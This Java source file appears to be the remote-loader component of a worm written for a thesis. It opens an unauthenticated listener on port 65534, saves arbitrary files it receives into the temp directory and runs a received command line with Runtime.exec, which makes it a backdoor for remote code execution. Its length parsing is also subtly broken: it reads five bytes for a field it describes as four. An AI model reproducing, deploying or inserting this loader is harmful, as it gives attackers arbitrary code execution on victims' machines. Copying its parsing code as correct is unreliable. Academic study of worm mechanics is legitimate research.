package com.rodneybeede.thesiswormremoteloader;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author rbeede
 */
public class Main {

	public static final int LISTEN_PORT = 65534;
	private static final byte[] buffer = new byte[1024 * 4];
	private static final int PACKET_SEPARATOR = (int) '\u001F';  // ASCII Unit Separator

	public static void main(final String[] args) throws IOException {
		final ServerSocket listenSocket = new ServerSocket(LISTEN_PORT);
		
		System.out.println("Listening on " + listenSocket.getLocalSocketAddress().toString());

		final Socket socket = listenSocket.accept();  // blocks

		System.out.println("Connection from " + socket.getRemoteSocketAddress().toString());

		final InputStream inputStream = socket.getInputStream();

		
		while (true) {
			// Read initial 5 bytes which indicate the command to be carried out
			int bytesRead = 0;
			while (bytesRead < 5) {
				bytesRead += inputStream.read(buffer, bytesRead, 5 - bytesRead);
			}

			assert (5 == bytesRead);

			switch (buffer[0]) {
				case 'S':  // SAVE
					handleSave(inputStream);
					break;
				case 'E':  // EXEC
					handleExec(inputStream);
					System.exit(0);  // shutdown 
					break;
				default:
					System.err.println("Unknown command type starting with " + buffer[0]);
			}
			
			// Repeat
		}
	}

	private static void handleSave(final InputStream inputStream) throws IOException {
		System.out.println("SAVE");
		
		final StringBuilder name = new StringBuilder();
		for (int readByte = inputStream.read(); PACKET_SEPARATOR != readByte; readByte = inputStream.read()) {
			name.append((char) readByte);
		}
		
		System.out.println("Name will be:  " + name.toString());

		// Length as 32-bit big-endian (MSB first) [4 bytes]
		int bytesRead = 0;
		while (bytesRead < 5) {
			bytesRead += inputStream.read(buffer, bytesRead, 5 - bytesRead);
		}
		
		
		final int dataLength =
			   // Because a byte in Java is signed we must convert each byte to a signed integer
			   //	and remove any upper-bits that may have been converted into a negative sign
			   // Then we shift by the necessary amount
			   (((int)buffer[0] & 0xFF) << 24)
			   +
			   (((int)buffer[1] & 0xFF) << 16)
			   +
			   (((int)buffer[2] & 0xFF) << 8)
			   +
			   (((int)buffer[3] & 0xFF))
			   ;
			   
			   
		System.out.println("Data length:  " + dataLength);

		
		final File file = new File(getStagingDirectory(), name.toString());
		final FileOutputStream fos = new FileOutputStream(file);
		
		int bytesRemaining = dataLength;
		while(bytesRemaining > 0) {			
			bytesRead = inputStream.read(buffer, 0, Math.min(buffer.length, bytesRemaining));
			
			bytesRemaining -= bytesRead;
			
			fos.write(buffer, 0, bytesRead);
		}
		
		fos.close();
		// Don't close the inputStream
		
		if(file.length() != dataLength) {
			System.err.println(file.getAbsolutePath() + " has actual length of " + file.length() + " bytes but expected " + dataLength + " bytes");
		}
		
		System.out.println(file.getAbsolutePath() + " has actual length of " + file.length() + " bytes");
	}
	
	
	private static void handleExec(final InputStream inputStream) throws IOException {
		System.out.println("EXEC");
		
		final StringBuilder commandLine = new StringBuilder();
		for (int readByte = inputStream.read(); PACKET_SEPARATOR != readByte; readByte = inputStream.read()) {
			commandLine.append((char) readByte);
		}

		final File tempDirectory = getStagingDirectory();
		
		System.out.println("Working directory will be " + tempDirectory.getAbsolutePath());
		
		commandLine.insert(0, tempDirectory.getAbsolutePath() + "\\");
		
		System.out.println();
		System.out.println("Executing command:  " + commandLine);
		
		
		
		Runtime.getRuntime().exec(commandLine.toString(), null, tempDirectory);
	}
	
	
	private static File getStagingDirectory() {
		final File directory = new File(System.getProperty("java.io.tmpdir"));
		
		if(!directory.exists()) {
			directory.mkdirs();
		}
		
		return directory;
	}
	
}
